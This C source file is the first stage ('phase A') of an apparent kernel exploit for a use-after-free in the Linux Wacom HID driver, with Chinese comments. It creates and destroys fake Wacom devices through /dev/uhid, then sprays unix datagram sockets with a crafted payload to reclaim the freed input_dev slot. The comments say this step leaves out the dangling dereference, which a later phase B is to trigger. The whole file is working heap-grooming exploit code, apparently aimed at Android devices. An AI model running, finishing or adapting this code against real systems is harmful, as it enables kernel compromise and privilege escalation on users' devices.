/*
 * place_test: 阶段A —— 只验证「payload 是否占住被释放的 input_dev 槽位」
 *
 * ★ 安全设计（这一版完全不触发 UAF 解引用）：
 *   只做 create t+p → destroy touch → spray → 结束
 *   **不发 MUTE**，所以 wacom_wac_irq 永远不会解引用悬垂的 touch_input。
 *
 *   判据完全靠 trace：
 *     input_dev_release+0x50 释放的 ptr
 *     是否出现在我们的 unix_dgram_sendmsg 分配里
 *
 *   零 panic 风险。占位成功后才进入阶段B（真触发）。
 *
 * 用法: place_test <cpu> <rounds> <pairs> <payload_file>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/uhid.h>

#define WACOM_VID   0x056a
#define PHYS_COMMON "placetest/55"

static const unsigned char rdesc_touch[] = {
    0x05, 0x0d, 0x09, 0x04, 0xa1, 0x01, 0x85, 0x01,
    0x05, 0x0d, 0x09, 0x22, 0xa1, 0x00,
    0x09, 0x42, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x32, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x01, 0x09, 0x30,
    0x16, 0x01, 0x00, 0x26, 0xff, 0x7f,
    0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x31, 0x26, 0xff, 0x7f, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0xc0,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x81, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0
};

static const unsigned char rdesc_pad[] = {
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x01, 0x85, 0x02,
    0x05, 0x0d, 0x09, 0x20, 0xa1, 0x02,
    0x05, 0x0d, 0x09, 0x39, 0xa1, 0x00,
    0x06, 0x0d, 0xff, 0x0a, 0x86, 0x09,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0x06, 0x0d, 0xff, 0x0a, 0x54, 0x04,
    0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02,
    0xc0, 0xc0, 0xc0
};

static long now_us(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec * 1000000L + ts.tv_nsec / 1000L;
}

static int uhid_create(int fd, const char *name, const char *phys, unsigned pid,
                       const unsigned char *rd, size_t rl) {
    static struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    snprintf((char *)ev.u.create2.name, sizeof(ev.u.create2.name), "%s", name);
    snprintf((char *)ev.u.create2.phys, sizeof(ev.u.create2.phys), "%s", phys);
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    ev.u.create2.version = 0x0100;
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.rd_size = rl;
    memcpy(ev.u.create2.rd_data, rd, rl);
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static int uhid_destroy(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    return write(fd, &ev, sizeof(ev)) == sizeof(ev) ? 0 : -1;
}

static void pump(int fd, long ms) {
    long dl = now_us() / 1000 + ms;
    struct uhid_event ev;
    int fc = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fc | O_NONBLOCK);
    while (now_us() / 1000 < dl) {
        if (read(fd, &ev, sizeof(ev)) <= 0) usleep(500);
    }
    fcntl(fd, F_SETFL, fc);
}

int main(int argc, char **argv) {
    int cpu     = argc > 1 ? atoi(argv[1]) : 0;
    int rounds  = argc > 2 ? atoi(argv[2]) : 10;
    int pairs   = argc > 3 ? atoi(argv[3]) : 400;
    const char *pfile = argc > 4 ? argv[4] : "/data/local/tmp/payload_guard.bin";

    FILE *pf = fopen(pfile, "rb");
    if (!pf) { perror("payload"); return 2; }
    static unsigned char pl[4096];
    size_t pl_len = fread(pl, 1, sizeof(pl), pf);
    fclose(pf);

    printf("=== place_test (PHASE A: NO MUTE, zero panic risk) ===\n");
    printf("pid=%d cpu=%d rounds=%d pairs=%d\n", getpid(), cpu, rounds, pairs);
    printf("payload=%s len=%zu\n", pfile, pl_len);
    printf("  0x098 = %02x %02x %02x %02x %02x %02x %02x %02x\n",
           pl[0x98], pl[0x99], pl[0x9a], pl[0x9b],
           pl[0x9c], pl[0x9d], pl[0x9e], pl[0x9f]);
    printf("  0x568 num_vals = %u\n", *(unsigned int *)(pl + 0x568));
    printf("  0x56c max_vals = %u\n", *(unsigned int *)(pl + 0x56c));
    printf("  0x570 vals = 0x%016llx\n", *(unsigned long long *)(pl + 0x570));
    printf("  0x598 guard = 0x%02x\n", pl[0x598]);
    fflush(stdout);

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        printf("pin fail: %s\n", strerror(errno));
        return 3;
    }
    printf("pinned cpu=%d running=%d\n", cpu, sched_getcpu());

    int (*sp)[2] = calloc(pairs, sizeof(int[2]));
    int made = 0;
    for (int i = 0; i < pairs; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sp[i]) < 0) continue;
        int sb = 8 << 20;
        setsockopt(sp[i][0], SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));
        setsockopt(sp[i][1], SOL_SOCKET, SO_RCVBUF, &sb, sizeof(sb));
        made++;
    }
    printf("socketpairs=%d\n", made);
    fflush(stdout);

    for (int r = 0; r < rounds; r++) {
        int fdt = open("/dev/uhid", O_RDWR | O_CLOEXEC);
        int fdp = open("/dev/uhid", O_RDWR | O_CLOEXEC);
        if (fdt < 0 || fdp < 0) { printf("uhid open fail\n"); break; }

        if (uhid_create(fdt, "pt-touch", PHYS_COMMON, 0x1101,
                        rdesc_touch, sizeof(rdesc_touch)) < 0) { printf("ct fail\n"); break; }
        pump(fdt, 100);
        if (uhid_create(fdp, "pt-pad", PHYS_COMMON, 0x1102,
                        rdesc_pad, sizeof(rdesc_pad)) < 0) { printf("cp fail\n"); break; }
        pump(fdp, 100);
        usleep(280000);   /* 等 wacom 绑定 */
        pump(fdt, 30); pump(fdp, 30);

        /* ★ 只 destroy touch → 释放 input_dev → 立即 spray。不发 MUTE。 */
        long t1 = now_us();
        uhid_destroy(fdt);
        close(fdt);
        int sent = 0;
        for (int i = 0; i < made; i++) {
            if (send(sp[i][0], pl, pl_len, MSG_DONTWAIT) >= 0) sent++;
        }
        long t2 = now_us();

        printf("round %2d: sent=%-4d destroy+spray=%ldus (no mute)\n",
               r, sent, t2 - t1);
        fflush(stdout);

        /* 清理 skb */
        char tmp[4096];
        for (int i = 0; i < made; i++)
            while (recv(sp[i][1], tmp, sizeof(tmp), MSG_DONTWAIT) > 0) ;

        /* destroy pad（此时 touch 已没了，pad 的 remove 会碰到 shared 清理，但那是正常路径） */
        uhid_destroy(fdp);
        close(fdp);
        usleep(60000);
    }

    printf("=== done %d rounds, pid=%d ===\n", rounds, getpid());
    fflush(stdout);
    return 0;
}